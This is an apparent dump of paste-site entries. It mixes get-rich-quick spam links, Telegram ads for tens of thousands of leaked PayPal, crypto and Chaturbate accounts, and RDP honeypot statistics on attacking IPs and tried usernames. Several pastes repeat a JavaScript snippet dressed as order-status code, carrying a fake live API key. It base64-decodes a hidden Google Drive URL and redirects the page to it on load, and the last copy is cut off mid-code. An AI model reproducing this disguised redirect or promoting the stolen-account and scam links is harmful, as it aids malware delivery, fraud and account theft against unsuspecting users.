id,title,username,language,date,content
cWx4c3sT,EARN $900 INSTANTLY 2025‚≠ê GV,MOHAMED69_VS,JavaScript,Wednesday 30th of April 2025 07:24:14 PM CDT," 
Pdf https://tinyurl.com/freshleaks

b8dl9rcRzo
"
HgVhJGff,Untitled,WantingTrae,JavaScript,Wednesday 30th of April 2025 07:19:07 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/32729/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ii4be6j0,Leaked Accounts - Fresh Hits,SpawnKz,JavaScript,Wednesday 30th of April 2025 07:19:03 PM CDT,49143 Accounts Posted On https://t.me/leakzbyeminem
k6Ap3K3h,2025-04-30_stats.json,rdp_snitch,JSON,Wednesday 30th of April 2025 07:18:26 PM CDT,"{
  ""ip"": {
    ""159.89.6.147"": 2025,
    ""80.94.95.198"": 36,
    ""111.89.163.100"": 51,
    ""195.154.56.122"": 3,
    ""71.82.170.60"": 45,
    ""167.94.138.42"": 3,
    ""211.185.207.14"": 30,
    ""205.210.31.150"": 9,
    ""194.187.176.238"": 3,
    ""221.181.44.30"": 9,
    ""80.94.95.90"": 6,
    ""88.214.25.122"": 6,
    ""91.238.181.93"": 6,
    ""185.39.19.53"": 6,
    ""54.204.98.247"": 204,
    ""62.60.188.24"": 6,
    ""180.93.172.74"": 3,
    ""45.117.177.2"": 1488,
    ""194.180.49.123"": 3,
    ""212.147.209.126"": 9,
    ""147.185.132.28"": 9,
    ""160.30.44.131"": 18,
    ""88.214.50.50"": 9,
    ""193.176.22.13"": 18,
    ""205.210.31.77"": 9,
    ""58.218.199.219"": 15,
    ""103.82.133.90"": 18,
    ""71.6.134.230"": 30,
    ""152.32.134.156"": 3,
    ""162.210.245.77"": 6,
    ""147.185.132.195"": 9,
    ""194.165.16.163"": 6,
    ""185.242.226.23"": 3
  },
  ""asn"": {
    ""AS14061"": 2025,
    ""AS204428"": 42,
    ""AS2514"": 51,
    ""AS12876"": 3,
    ""AS20115"": 45,
    ""AS398324"": 3,
    ""AS4766"": 30,
    ""AS396982"": 36,
    ""AS208843"": 3,
    ""AS9808"": 9,
    ""AS35042"": 6,
    ""AS49434"": 6,
    ""AS213021"": 6,
    ""AS14618"": 204,
    ""AS215930"": 6,
    ""AS135944"": 3,
    ""AS131353"": 1488,
    ""AS201814"": 3,
    ""AS50837"": 9,
    ""AS152963"": 18,
    ""Unknown"": 27,
    ""AS4134"": 15,
    ""AS149089"": 18,
    ""AS10439"": 30,
    ""AS135377"": 3,
    ""AS397651"": 6,
    ""AS48721"": 6,
    ""AS202425"": 3
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 2025,
    ""SS-Net"": 42,
    ""NTT PC Communications, Inc."": 51,
    ""Online SAS"": 3,
    ""Charter Communications"": 45,
    ""Censys, Inc."": 3,
    ""Korea Telecom"": 30,
    ""Google LLC"": 36,
    ""Alpha Strike Labs GmbH"": 3,
    ""China Mobile communications corporation"": 9,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Datacenter location PAR1 France"": 6,
    ""Prime LLC"": 6,
    ""Amazon.com, Inc."": 204,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 6,
    ""SPT"": 3,
    ""NHANHOA"": 1488,
    ""MEVSPACE sp. z o.o."": 3,
    ""CLOUDSIGMA AG"": 9,
    ""Phuong Nam Company Limited"": 18,
    ""SIA \""Singularity Telecom\"""": 27,
    ""Chinanet"": 15,
    ""Cloudfly Corporation"": 18,
    ""CariNet, Inc."": 30,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""RCI Broadband"": 6,
    ""Flyservers S.A."": 6,
    ""IP Volume inc"": 3
  },
  ""org"": {
    ""DigitalOcean, LLC"": 2025,
    ""Unmanaged LTD"": 42,
    ""InfoSphere"": 51,
    ""Unknown"": 3,
    ""Spectrum"": 45,
    ""Censys, Inc"": 3,
    ""Kornet"": 30,
    ""Palo Alto Networks, Inc"": 36,
    ""Alpha Strike Labs GmbH"": 3,
    ""China Mobile"": 9,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Prime LLC"": 6,
    ""AWS EC2 (us-east-1)"": 204,
    ""UAB Host Baltic"": 6,
    ""Saigon Postel Corporation"": 3,
    ""Branch of Nhan Hoa Software Company"": 1488,
    ""HostSlick"": 3,
    ""ServeCentric Ltd"": 9,
    ""Phuong Nam Company Limited"": 18,
    ""SIA \""Singularity Telecom\"""": 27,
    ""Chinanet JS"": 15,
    ""Cloudfly Corporation"": 18,
    ""CariNet, Inc."": 30,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""10x Servers"": 6,
    ""Flyservers S.A"": 6,
    ""AI Spera"": 3
  },
  ""regionName"": {
    ""Hesse"": 2025,
    ""Budapest"": 42,
    ""Tokyo"": 51,
    ""\u00cele-de-France"": 9,
    ""Wisconsin"": 45,
    ""Michigan"": 3,
    ""Sejong-si"": 30,
    ""California"": 36,
    ""State of Berlin"": 3,
    ""Guangdong"": 9,
    ""Kowloon City"": 6,
    ""Moscow"": 6,
    ""Virginia"": 210,
    ""Tehran"": 6,
    ""Ho Chi Minh"": 1509,
    ""Bavaria"": 3,
    ""Leinster"": 9,
    ""New York"": 27,
    ""Jiangsu"": 15,
    ""Haryana"": 18,
    ""Nevada"": 30,
    ""Kowloon"": 3,
    ""Kaunas"": 6,
    ""North Holland"": 3
  },
  ""country"": {
    ""Germany"": 2031,
    ""Hungary"": 42,
    ""Japan"": 51,
    ""France"": 9,
    ""United States"": 351,
    ""South Korea"": 30,
    ""China"": 24,
    ""Hong Kong"": 9,
    ""Russia"": 6,
    ""Iran"": 6,
    ""Vietnam"": 1509,
    ""Ireland"": 9,
    ""India"": 18,
    ""Lithuania"": 6,
    ""The Netherlands"": 3
  },
  ""account"": {
    ""hello"": 3798,
    ""142.93.8.59"": 162,
    ""Administr"": 15,
    ""(empty)"": 3,
    ""SuycWhFfc"": 3,
    ""LHXnFE"": 3,
    ""rVFOuo"": 3,
    ""user"": 3,
    ""Test"": 30,
    ""lkAuCCnNl"": 3,
    ""yIZliE"": 3,
    ""wsCuBl"": 3,
    ""Domain"": 21,
    ""IPhzQoqOD"": 3,
    ""OvdaWM"": 3,
    ""mGeXyl"": 3,
    ""eltons"": 15,
    ""administr"": 15,
    ""Administrator"": 3,
    ""FwmxuXatt"": 3,
    ""wtlMWI"": 3,
    ""xWcAbR"": 3,
    ""nmap"": 3
  },
  ""keyboard"": {
    ""Unknown"": 4104
  },
  ""client_build"": {
    ""Unknown"": 4104
  },
  ""client_name"": {
    ""Unknown"": 4104
  },
  ""ip_type"": {
    ""hosting"": 3804,
    ""Unknown"": 270,
    ""mobile"": 9,
    ""proxy"": 21
  }
}"
eFU6v0g4,Hazbin | HardRP,Sova813,HTML,Wednesday 30th of April 2025 07:16:58 PM CDT,"<align=""center"">
<size=55><color=#8b0000>H<color=#800000>a<color=#800080>z<color=#9400d2>b<color=#8a2ae2>i<color=#9370db>n<color=#ffffff> | <color=#d39bef>H<color=#c882eb>a<color=#bd69e7>r<color=#b250e3>d<color=#a737df> <color=#9c1edb>R<color=#8a2ae2>P</color>
<align=""left"">
<size=18>Hazbin HardRP ‚Äî <color=#ffffff><size=18>RP –°–µ—Ä–≤–µ—Ä –≥–¥–µ –æ—Ç—ã–≥—Ä–æ–≤–∫–∞ –≤–∞–∂–Ω–µ–µ –ø—Ä–∞–≤–∏–ª, –æ—Ç—ã–≥—Ä–æ–≤–∫–∞ –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ –ø—Ä–∏–±–ª–∏–∂–µ–Ω–∞ –∫ —Ä–µ–∞–ª—å–Ω–æ—Å—Ç–∏, –º—ã –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤—É–µ–º —Å–≤–æ–±–æ–¥–Ω—É—é –æ—Ç—ã–≥—Ä–æ–≤–∫—É
–ö–∞–∂–¥—ã–π —Ä–∞—É–Ω–¥ —É –Ω–∞—Å –ø—Ä–æ–≤–æ–¥–∏—Ç—Å—è –≤—Ä—É—á–Ω—É—é –ø–æ–¥ —Ä—É–∫–æ–≤–æ–¥—Å—Ç–≤–æ–º –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏–∏, —Ä–∞—É–Ω–¥—ã —Å –æ—Å–æ–±—ã–º —Å—é–∂–µ—Ç–æ–º –ø—Ä–æ–≤–æ–¥—è—Ç—Å—è —Å –∞–Ω–æ–Ω—Å–∞–º–∏ –≤ –Ω–∞—à–µ–º –¥–∏—Å–∫–æ—Ä–¥–µ</color>
 
<size=25><link=""https://discord.gg/FVTXFnTjJV""><mark=#2b2b2b><color=#ffffff><size=25>|üíæ|<size=25><mark=#3b3b3b>  –ù–∞—à –¥–∏—Å–∫–æ—Ä–¥ —Å–µ—Ä–≤–µ—Ä  |<space=0.1em></mark></link></size>
 
<size=25><link=""https://docs.google.com/document/d/1bAQrYSJkswJ-xDpeiVdCL6h1Z5ZxB9r7tbR37UI_O_w/edit?tab=t.0""><mark=#2b2b2b><color=#ffffff><size=25>|üìï|<size=25><mark=#3b3b3b>  –ü—Ä–∞–≤–∏–ª–∞|<space=0.1em>|</mark></link></size></align>
<size=0>powered by: nu-forward</size>"
csNe1Z9i,2025-04-30_stats.json,rdp_snitch,JSON,Wednesday 30th of April 2025 07:16:16 PM CDT,"{
  ""ip"": {
    ""159.89.6.147"": 1350,
    ""80.94.95.198"": 24,
    ""111.89.163.100"": 34,
    ""195.154.56.122"": 2,
    ""71.82.170.60"": 30,
    ""167.94.138.42"": 2,
    ""211.185.207.14"": 20,
    ""205.210.31.150"": 6,
    ""194.187.176.238"": 2,
    ""221.181.44.30"": 6,
    ""80.94.95.90"": 4,
    ""88.214.25.122"": 4,
    ""91.238.181.93"": 4,
    ""185.39.19.53"": 4,
    ""54.204.98.247"": 136,
    ""62.60.188.24"": 4,
    ""180.93.172.74"": 2,
    ""45.117.177.2"": 992,
    ""194.180.49.123"": 2,
    ""212.147.209.126"": 6,
    ""147.185.132.28"": 6,
    ""160.30.44.131"": 12,
    ""88.214.50.50"": 6,
    ""193.176.22.13"": 12,
    ""205.210.31.77"": 6,
    ""58.218.199.219"": 10,
    ""103.82.133.90"": 12,
    ""71.6.134.230"": 20,
    ""152.32.134.156"": 2,
    ""162.210.245.77"": 4,
    ""147.185.132.195"": 6,
    ""194.165.16.163"": 4,
    ""185.242.226.23"": 2
  },
  ""asn"": {
    ""AS14061"": 1350,
    ""AS204428"": 28,
    ""AS2514"": 34,
    ""AS12876"": 2,
    ""AS20115"": 30,
    ""AS398324"": 2,
    ""AS4766"": 20,
    ""AS396982"": 24,
    ""AS208843"": 2,
    ""AS9808"": 6,
    ""AS35042"": 4,
    ""AS49434"": 4,
    ""AS213021"": 4,
    ""AS14618"": 136,
    ""AS215930"": 4,
    ""AS135944"": 2,
    ""AS131353"": 992,
    ""AS201814"": 2,
    ""AS50837"": 6,
    ""AS152963"": 12,
    ""Unknown"": 18,
    ""AS4134"": 10,
    ""AS149089"": 12,
    ""AS10439"": 20,
    ""AS135377"": 2,
    ""AS397651"": 4,
    ""AS48721"": 4,
    ""AS202425"": 2
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 1350,
    ""SS-Net"": 28,
    ""NTT PC Communications, Inc."": 34,
    ""Online SAS"": 2,
    ""Charter Communications"": 30,
    ""Censys, Inc."": 2,
    ""Korea Telecom"": 20,
    ""Google LLC"": 24,
    ""Alpha Strike Labs GmbH"": 2,
    ""China Mobile communications corporation"": 6,
    ""NOC EMAIL: noc@one-host.net"": 4,
    ""Datacenter location PAR1 France"": 4,
    ""Prime LLC"": 4,
    ""Amazon.com, Inc."": 136,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 4,
    ""SPT"": 2,
    ""NHANHOA"": 992,
    ""MEVSPACE sp. z o.o."": 2,
    ""CLOUDSIGMA AG"": 6,
    ""Phuong Nam Company Limited"": 12,
    ""SIA \""Singularity Telecom\"""": 18,
    ""Chinanet"": 10,
    ""Cloudfly Corporation"": 12,
    ""CariNet, Inc."": 20,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""RCI Broadband"": 4,
    ""Flyservers S.A."": 4,
    ""IP Volume inc"": 2
  },
  ""org"": {
    ""DigitalOcean, LLC"": 1350,
    ""Unmanaged LTD"": 28,
    ""InfoSphere"": 34,
    ""Unknown"": 2,
    ""Spectrum"": 30,
    ""Censys, Inc"": 2,
    ""Kornet"": 20,
    ""Palo Alto Networks, Inc"": 24,
    ""Alpha Strike Labs GmbH"": 2,
    ""China Mobile"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 8,
    ""Prime LLC"": 4,
    ""AWS EC2 (us-east-1)"": 136,
    ""UAB Host Baltic"": 4,
    ""Saigon Postel Corporation"": 2,
    ""Branch of Nhan Hoa Software Company"": 992,
    ""HostSlick"": 2,
    ""ServeCentric Ltd"": 6,
    ""Phuong Nam Company Limited"": 12,
    ""SIA \""Singularity Telecom\"""": 18,
    ""Chinanet JS"": 10,
    ""Cloudfly Corporation"": 12,
    ""CariNet, Inc."": 20,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""10x Servers"": 4,
    ""Flyservers S.A"": 4,
    ""AI Spera"": 2
  },
  ""regionName"": {
    ""Hesse"": 1350,
    ""Budapest"": 28,
    ""Tokyo"": 34,
    ""\u00cele-de-France"": 6,
    ""Wisconsin"": 30,
    ""Michigan"": 2,
    ""Sejong-si"": 20,
    ""California"": 24,
    ""State of Berlin"": 2,
    ""Guangdong"": 6,
    ""Kowloon City"": 4,
    ""Moscow"": 4,
    ""Virginia"": 140,
    ""Tehran"": 4,
    ""Ho Chi Minh"": 1006,
    ""Bavaria"": 2,
    ""Leinster"": 6,
    ""New York"": 18,
    ""Jiangsu"": 10,
    ""Haryana"": 12,
    ""Nevada"": 20,
    ""Kowloon"": 2,
    ""Kaunas"": 4,
    ""North Holland"": 2
  },
  ""country"": {
    ""Germany"": 1354,
    ""Hungary"": 28,
    ""Japan"": 34,
    ""France"": 6,
    ""United States"": 234,
    ""South Korea"": 20,
    ""China"": 16,
    ""Hong Kong"": 6,
    ""Russia"": 4,
    ""Iran"": 4,
    ""Vietnam"": 1006,
    ""Ireland"": 6,
    ""India"": 12,
    ""Lithuania"": 4,
    ""The Netherlands"": 2
  },
  ""account"": {
    ""hello"": 2532,
    ""142.93.8.59"": 108,
    ""Administr"": 10,
    ""(empty)"": 2,
    ""SuycWhFfc"": 2,
    ""LHXnFE"": 2,
    ""rVFOuo"": 2,
    ""user"": 2,
    ""Test"": 20,
    ""lkAuCCnNl"": 2,
    ""yIZliE"": 2,
    ""wsCuBl"": 2,
    ""Domain"": 14,
    ""IPhzQoqOD"": 2,
    ""OvdaWM"": 2,
    ""mGeXyl"": 2,
    ""eltons"": 10,
    ""administr"": 10,
    ""Administrator"": 2,
    ""FwmxuXatt"": 2,
    ""wtlMWI"": 2,
    ""xWcAbR"": 2,
    ""nmap"": 2
  },
  ""keyboard"": {
    ""Unknown"": 2736
  },
  ""client_build"": {
    ""Unknown"": 2736
  },
  ""client_name"": {
    ""Unknown"": 2736
  },
  ""ip_type"": {
    ""hosting"": 2536,
    ""Unknown"": 180,
    ""mobile"": 6,
    ""proxy"": 14
  }
}"
GbgSEW66,2025-04-30_stats.json,rdp_snitch,JSON,Wednesday 30th of April 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""159.89.6.147"": 675,
    ""80.94.95.198"": 12,
    ""111.89.163.100"": 17,
    ""195.154.56.122"": 1,
    ""71.82.170.60"": 15,
    ""167.94.138.42"": 1,
    ""211.185.207.14"": 10,
    ""205.210.31.150"": 3,
    ""194.187.176.238"": 1,
    ""221.181.44.30"": 3,
    ""80.94.95.90"": 2,
    ""88.214.25.122"": 2,
    ""91.238.181.93"": 2,
    ""185.39.19.53"": 2,
    ""54.204.98.247"": 68,
    ""62.60.188.24"": 2,
    ""180.93.172.74"": 1,
    ""45.117.177.2"": 496,
    ""194.180.49.123"": 1,
    ""212.147.209.126"": 3,
    ""147.185.132.28"": 3,
    ""160.30.44.131"": 6,
    ""88.214.50.50"": 3,
    ""193.176.22.13"": 6,
    ""205.210.31.77"": 3,
    ""58.218.199.219"": 5,
    ""103.82.133.90"": 6,
    ""71.6.134.230"": 10,
    ""152.32.134.156"": 1,
    ""162.210.245.77"": 2,
    ""147.185.132.195"": 3,
    ""194.165.16.163"": 2,
    ""185.242.226.23"": 1
  },
  ""asn"": {
    ""AS14061"": 675,
    ""AS204428"": 14,
    ""AS2514"": 17,
    ""AS12876"": 1,
    ""AS20115"": 15,
    ""AS398324"": 1,
    ""AS4766"": 10,
    ""AS396982"": 12,
    ""AS208843"": 1,
    ""AS9808"": 3,
    ""AS35042"": 2,
    ""AS49434"": 2,
    ""AS213021"": 2,
    ""AS14618"": 68,
    ""AS215930"": 2,
    ""AS135944"": 1,
    ""AS131353"": 496,
    ""AS201814"": 1,
    ""AS50837"": 3,
    ""AS152963"": 6,
    ""Unknown"": 9,
    ""AS4134"": 5,
    ""AS149089"": 6,
    ""AS10439"": 10,
    ""AS135377"": 1,
    ""AS397651"": 2,
    ""AS48721"": 2,
    ""AS202425"": 1
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 675,
    ""SS-Net"": 14,
    ""NTT PC Communications, Inc."": 17,
    ""Online SAS"": 1,
    ""Charter Communications"": 15,
    ""Censys, Inc."": 1,
    ""Korea Telecom"": 10,
    ""Google LLC"": 12,
    ""Alpha Strike Labs GmbH"": 1,
    ""China Mobile communications corporation"": 3,
    ""NOC EMAIL: noc@one-host.net"": 2,
    ""Datacenter location PAR1 France"": 2,
    ""Prime LLC"": 2,
    ""Amazon.com, Inc."": 68,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 2,
    ""SPT"": 1,
    ""NHANHOA"": 496,
    ""MEVSPACE sp. z o.o."": 1,
    ""CLOUDSIGMA AG"": 3,
    ""Phuong Nam Company Limited"": 6,
    ""SIA \""Singularity Telecom\"""": 9,
    ""Chinanet"": 5,
    ""Cloudfly Corporation"": 6,
    ""CariNet, Inc."": 10,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""RCI Broadband"": 2,
    ""Flyservers S.A."": 2,
    ""IP Volume inc"": 1
  },
  ""org"": {
    ""DigitalOcean, LLC"": 675,
    ""Unmanaged LTD"": 14,
    ""InfoSphere"": 17,
    ""Unknown"": 1,
    ""Spectrum"": 15,
    ""Censys, Inc"": 1,
    ""Kornet"": 10,
    ""Palo Alto Networks, Inc"": 12,
    ""Alpha Strike Labs GmbH"": 1,
    ""China Mobile"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""Prime LLC"": 2,
    ""AWS EC2 (us-east-1)"": 68,
    ""UAB Host Baltic"": 2,
    ""Saigon Postel Corporation"": 1,
    ""Branch of Nhan Hoa Software Company"": 496,
    ""HostSlick"": 1,
    ""ServeCentric Ltd"": 3,
    ""Phuong Nam Company Limited"": 6,
    ""SIA \""Singularity Telecom\"""": 9,
    ""Chinanet JS"": 5,
    ""Cloudfly Corporation"": 6,
    ""CariNet, Inc."": 10,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""10x Servers"": 2,
    ""Flyservers S.A"": 2,
    ""AI Spera"": 1
  },
  ""regionName"": {
    ""Hesse"": 675,
    ""Budapest"": 14,
    ""Tokyo"": 17,
    ""\u00cele-de-France"": 3,
    ""Wisconsin"": 15,
    ""Michigan"": 1,
    ""Sejong-si"": 10,
    ""California"": 12,
    ""State of Berlin"": 1,
    ""Guangdong"": 3,
    ""Kowloon City"": 2,
    ""Moscow"": 2,
    ""Virginia"": 70,
    ""Tehran"": 2,
    ""Ho Chi Minh"": 503,
    ""Bavaria"": 1,
    ""Leinster"": 3,
    ""New York"": 9,
    ""Jiangsu"": 5,
    ""Haryana"": 6,
    ""Nevada"": 10,
    ""Kowloon"": 1,
    ""Kaunas"": 2,
    ""North Holland"": 1
  },
  ""country"": {
    ""Germany"": 677,
    ""Hungary"": 14,
    ""Japan"": 17,
    ""France"": 3,
    ""United States"": 117,
    ""South Korea"": 10,
    ""China"": 8,
    ""Hong Kong"": 3,
    ""Russia"": 2,
    ""Iran"": 2,
    ""Vietnam"": 503,
    ""Ireland"": 3,
    ""India"": 6,
    ""Lithuania"": 2,
    ""The Netherlands"": 1
  },
  ""account"": {
    ""hello"": 1266,
    ""142.93.8.59"": 54,
    ""Administr"": 5,
    ""(empty)"": 1,
    ""SuycWhFfc"": 1,
    ""LHXnFE"": 1,
    ""rVFOuo"": 1,
    ""user"": 1,
    ""Test"": 10,
    ""lkAuCCnNl"": 1,
    ""yIZliE"": 1,
    ""wsCuBl"": 1,
    ""Domain"": 7,
    ""IPhzQoqOD"": 1,
    ""OvdaWM"": 1,
    ""mGeXyl"": 1,
    ""eltons"": 5,
    ""administr"": 5,
    ""Administrator"": 1,
    ""FwmxuXatt"": 1,
    ""wtlMWI"": 1,
    ""xWcAbR"": 1,
    ""nmap"": 1
  },
  ""keyboard"": {
    ""Unknown"": 1368
  },
  ""client_build"": {
    ""Unknown"": 1368
  },
  ""client_name"": {
    ""Unknown"": 1368
  },
  ""ip_type"": {
    ""hosting"": 1268,
    ""Unknown"": 90,
    ""mobile"": 3,
    ""proxy"": 7
  }
}"
HcPZV95u,Make $1000 15-MINUTES  (BEGINNER) YR,MOHAMED69_VS,JavaScript,Wednesday 30th of April 2025 07:15:00 PM CDT," 
Pdf https://tinyurl.com/freshleaks

QqlQkZmtMV
"
MZ6aFwSw,EARN $900 INSTANTLY 2025 95,MOHAMED69_VS,JavaScript,Wednesday 30th of April 2025 07:05:47 PM CDT," 
Pdf https://tinyurl.com/freshleaks

PZlI9WRjv4
"
kFAQww2k,Products.js,WantingTrae,JavaScript,Wednesday 30th of April 2025 07:03:46 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45722/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NmmDna8S,Chaturbate with Tokens,SpawnKz,JavaScript,Wednesday 30th of April 2025 07:03:41 PM CDT,28510 Accounts Posted On https://t.me/leakzbyeminem
3gRxvTBT,Make $1000 15-MINUTES (BEGINNER) L4,MOHAMED69_VS,JavaScript,Wednesday 30th of April 2025 06:56:33 PM CDT," 
Pdf https://tinyurl.com/freshleaks

dc62x9RDTA
"
X6vuH7uk,Order.js,WantingTrae,JavaScript,Wednesday 30th of April 2025 06:48:24 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/49837/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kHHYzBRt,Crypto Accounts,SpawnKz,JavaScript,Wednesday 30th of April 2025 06:48:18 PM CDT,33384 Accounts Posted On https://t.me/leakzbyeminem
FtVTgffK,EARN $900 INSTANTLY 2025‚≠ê GV,MOHAMED69_VS,JavaScript,Wednesday 30th of April 2025 06:47:19 PM CDT," 
Pdf https://tinyurl.com/freshleaks

ygHK0ZMoGx
"
7iA9tATv,Make $1000 15-MINUTES  (BEGINNER) YR,MOHAMED69_VS,JavaScript,Wednesday 30th of April 2025 06:38:06 PM CDT," 
Pdf https://tinyurl.com/freshleaks

qXVIiVemmO
"
9LDLUzBn,Market.js,WantingTrae,JavaScript,Wednesday 30th of April 2025 06:33:02 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/18065/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jWdVNJXm,PayPal with Balance,SpawnKz,JavaScript,Wednesday 30th of April 2025 06:32:56 PM CDT,11340 Accounts Posted On https://t.me/leakzbyeminem
84AVRbfu,EARN $900 INSTANTLY 2025 95,MOHAMED69_VS,JavaScript,Wednesday 30th of April 2025 06:28:52 PM CDT," 
Pdf https://tinyurl.com/freshleaks

S1Ctl46nHK
"
Ex8Hvqkh,Untitled,WantingTrae,JavaScript,Wednesday 30th of April 2025 06:17:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84331/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jbXj5TCy,PayPal with Balance,WantingTrae,JavaScript,Wednesday 30th of April 2025 06:17:31 PM CDT,82955 Accounts Posted On https://t.me/leakzbyeminem
eg8CgKXG,Untitled,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 06:02:14 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/50859/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
